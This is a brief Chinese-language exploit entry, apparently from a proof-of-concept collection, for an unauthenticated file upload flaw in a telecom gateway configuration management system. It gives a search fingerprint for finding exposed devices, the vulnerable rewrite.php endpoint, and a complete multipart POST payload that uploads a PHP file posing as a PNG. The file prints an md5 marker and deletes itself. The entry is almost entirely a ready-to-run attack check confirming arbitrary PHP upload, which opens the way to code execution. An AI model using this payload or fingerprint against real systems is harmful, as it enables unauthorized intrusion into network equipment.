# 电信网关配置管理系统-文件上传-rewrite

电信网关配置管理系统 ｜ 文件上传 ｜ —
- **指纹**：`body="img/dl.gif"`
- **请求**：`POST /manager/teletext/material/rewrite.php HTTP/1.1`

**Payload**
```
------WebKitFormBoundaryOKldnDPT
Content-Disposition: form-data; name="tmp_name"; filename="dudesite.php"
Content-Type: image/png
<?php echo md5('666');unlink(__FILE__);?>
------WebKitFormBoundaryOKldnDPT
Content-Disposition: form-data; name="uploadtime"
------WebKitFormBoundaryOKldnDPT--
```
- **响应特征**：200